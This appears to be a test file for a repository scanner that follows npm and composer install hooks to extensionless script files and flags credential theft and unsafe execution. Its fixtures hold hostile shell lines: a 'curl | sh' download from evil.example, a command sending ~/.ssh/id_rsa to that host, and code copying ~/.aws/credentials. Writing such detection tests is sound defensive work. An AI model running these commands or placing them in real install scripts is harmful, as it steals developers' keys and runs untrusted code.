import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8: the scan reads install scripts. A lifecycle hook may carry
 * only the name of a repository file, and the file runs at install. A name
 * classifier cannot see `scripts/setup`, and with no shebang nothing else
 * marks it, so before this the file was not in the inventory at all while
 * every surface still read complete: the project could clear with the whole
 * payload unreviewed. A recognized extension or a shebang is already covered
 * by the name classifier and needs no second mechanism.
 */
function inspected(files: { path: string; text: string }[]) {
  return inspectRepository({
    files: files.map((file) => ({
      path: file.path,
      bytes: new TextEncoder().encode(file.text),
    })),
  });
}

function described(files: { path: string; text: string }[]) {
  return inspected(files).findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

function inventoryItems(files: { path: string; text: string }[]) {
  const inventory = JSON.parse(
    new TextDecoder().decode(inspected(files).inventory),
  ) as { items: { id: string }[] };
  return inventory.items.map((item) => item.id);
}

function hook(value: string | string[]) {
  return JSON.stringify({ scripts: { postinstall: value } }, null, 2);
}

const STEALER = [
  "set -e",
  "curl -s https://evil.example/p | sh",
  "cat ~/.ssh/id_rsa | curl -d @- https://evil.example/k",
  "",
].join("\n");

test("a hook that names an extensionless file gets the file reviewed", () => {
  const files = [
    { path: "package.json", text: hook("sh scripts/setup") },
    { path: "scripts/setup", text: STEALER },
  ];
  // The path has no extension and no shebang, so nothing else classifies it.
  expect(described(files)).toEqual([
    "scripts/setup:credential-theft:high",
    "scripts/setup:unsafe-execution:high",
  ]);
  expect(inventoryItems(files)).toContain("scripts/setup");
});

test("a hook that only reads a credential is still reviewed", () => {
  // No download, so only the read itself can surface the file.
  const files = [
    { path: "package.json", text: hook("node ./bin/boot") },
    {
      path: "bin/boot",
      text: `require('fs').copyFileSync(\`\${process.env.HOME}/.aws/credentials\`, '/tmp/c');\n`,
    },
  ];
  expect(described(files)).toEqual(["bin/boot:credential-theft:high"]);
  expect(inventoryItems(files)).toContain("bin/boot");
});

test("shell flags, quotes and composer lists keep the file in review", () => {
  for (const [manifest, hookValue, target] of [
    ["package.json", hook("bash -e scripts/setup"), "scripts/setup"],
    ["package.json", hook('sh "scripts/setup"'), "scripts/setup"],
    [
      "composer.json",
      JSON.stringify({
        scripts: { "post-install-cmd": ["bash ./tools/prepare"] },
      }),
      "tools/prepare",
    ],
    ["package.json", hook("cd tools && sh prepare"), "tools/prepare"],
  ] as const) {
    const files = [
      { path: manifest, text: hookValue },
      { path: target, text: "curl -s https://evil.example/p | sh\n" },
    ];
    expect(described(files)).toEqual([`${target}:unsafe-execution:high`]);
  }
});

test("a script extension the interpreter completes is not a gap", () => {
  // `node scripts/postinstall` runs `scripts/postinstall.js`, the form
  // protobufjs ships. The completed file is already classified by its name.
  const files = [
    { path: "package.json", text: hook("node scripts/postinstall") },
    {
      path: "scripts/postinstall.js",
      text: `require('fs').readFileSync(\`\${process.env.HOME}/.npmrc\`);\n`,
    },
  ];
  const result = inspected(files);
  expect(result.visibilityGaps).toEqual([]);
  expect(result.coverage.installScripts.state).toBe("complete");
  expect(inventoryItems(files)).toContain("scripts/postinstall.js");
});

test("a named directory resolves to its index", () => {
  const files = [
    { path: "package.json", text: hook("node ./bin") },
    { path: "bin/index.js", text: "console.log('x');\n" },
  ];
  expect(inspected(files).visibilityGaps).toEqual([]);
});

test("a code flag takes program text, not a file", () => {
  for (const value of [
    'node -e "console.log(1)"',
    'python3 -c "print(1)"',
    'sh -c "curl -s https://example.test/x | sh"',
    'perl -e "print 1"',
    "python -m http.server",
  ]) {
    const result = inspected([{ path: "package.json", text: hook(value) }]);
    // A hook that downloads its own text is a different gap.
    expect(
      result.visibilityGaps.filter((gap) =>
        gap.startsWith("Install hook file not acquired"),
      ),
    ).toEqual([]);
  }
  // The shell's `-e` is errexit and keeps the file argument.
  const files = [
    { path: "package.json", text: hook("sh -e scripts/setup") },
    { path: "scripts/setup", text: "curl -s https://evil.example/p | sh\n" },
  ];
  expect(described(files)).toEqual(["scripts/setup:unsafe-execution:high"]);
});

test("a named file missing from the tree is a visibility gap", () => {
  const result = inspected([
    { path: "package.json", text: hook("sh scripts/setup") },
  ]);
  expect(result.visibilityGaps).toEqual([
    "Install hook file not acquired: scripts/setup",
  ]);
  // Unreviewed install content cannot read complete.
  expect(result.coverage.installScripts.state).toBe("partial");
});

test("ordinary hooks add no gap and no second classification", () => {
  for (const [hookValue, target] of [
    // A script name, not a path: npm resolves it.
    ["npm run build", null],
    // A package binary is installed, not committed.
    ["./node_modules/.bin/tsc", null],
    // Outside the repository, or resolved by the shell.
    ["sh /usr/local/bin/tool", null],
    ["sh $HOME/tool", null],
    ["sh https://example.test/tool", null],
    ["patch-package", null],
    // A directory has no content of its own.
    ["sh scripts/", null],
  ] as const) {
    const files = [{ path: "package.json", text: hook(hookValue) }];
    if (target !== null) files.push({ path: target, text: "" });
    const result = inspected(files);
    expect(result.visibilityGaps).toEqual([]);
    expect(result.coverage.installScripts.state).toBe("complete");
  }
});

test("a named file the name classifier already sees keeps one item", () => {
  const files = [
    { path: "package.json", text: hook("node scripts/gen.js") },
    { path: "scripts/gen.js", text: "console.log('x');\n" },
  ];
  expect(inventoryItems(files)).toEqual(["package.json", "scripts/gen.js"]);
  expect(inspected(files).visibilityGaps).toEqual([]);
});
